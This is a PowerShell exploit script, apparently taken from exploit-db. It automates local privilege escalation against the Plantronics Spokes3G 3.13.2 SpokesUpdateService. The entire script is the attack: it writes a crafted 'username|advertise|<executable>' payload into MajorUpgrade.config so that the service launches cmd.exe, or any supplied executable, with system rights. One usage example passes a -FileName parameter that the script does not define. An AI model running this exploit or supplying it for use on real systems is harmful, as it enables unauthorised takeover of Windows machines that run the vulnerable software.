<#
        .SYNOPSIS
        Automates the local privilege escalation against Plantronics 3.13.2 SpokesUpdateService

        .DESCRIPTION
        Tested on Microsoft Windows Server 2019.
        This script can be run as-is or with user-supplied inputs.

        .PARAMETER Spokes3GDirectory
        This is the base Spokes3G directory.
        Defaults to C:\ProgramData\Plantronics\Spokes3G

        .PARAMETER TargetFile
        This is the target upgrade file.
        Defaults to MajorUpgrade.config

        .PARAMETER Payload
        This is the command execution string.
        Defaults to "$($env:USERNAME)|advertise|C:\Windows\System32\cmd.exe"

        .INPUTS
        None. You cannot pipe objects to Add-Extension.

        .OUTPUTS
        None.

        .EXAMPLE
        PS> .\Get-Spokes3GSystem.ps1

        .EXAMPLE
        PS> .\Get-Spokes3GSystem.ps1 -Spokes3GDirectory 'C:\Path\To\Spokes3G' -FileName 'FileName.config' -Payload "username|advertise|C:\Windows\Temp\payload.exe"

        .LINK
        https://www.exploit-db.com/exploits/47845
#>
[CmdletBinding()]
param (
    [Parameter()]
    [ValidateScript({
        if (-not ([System.IO.Directory]::Exists($_))) {
            throw $_.Exception
        }
        else {
            return $true
        }
    })]
    [String]$Spokes3GDirectory = 'C:\ProgramData\Plantronics\Spokes3G',

    [Parameter()]
    [ValidateNotNullOrEmpty()]
    [String]$TargetFile = 'MajorUpgrade.config',

    [Parameter()]
    [ValidateNotNullOrEmpty()]
    [String]$Payload = "$($env:USERNAME)|advertise|C:\Windows\System32\cmd.exe"
)
begin {
    $pathToFile = $Spokes3GDirectory + [System.IO.Path]::DirectorySeparatorChar + $TargetFile
    [Byte[]][Char[]]$byteArray = $Payload
}
process {
    $file = [System.IO.File]::Create($pathToFile)
    $file.Write($byteArray, 0, $byteArray.Length)
}
end {
    $file.Close()
    return
}
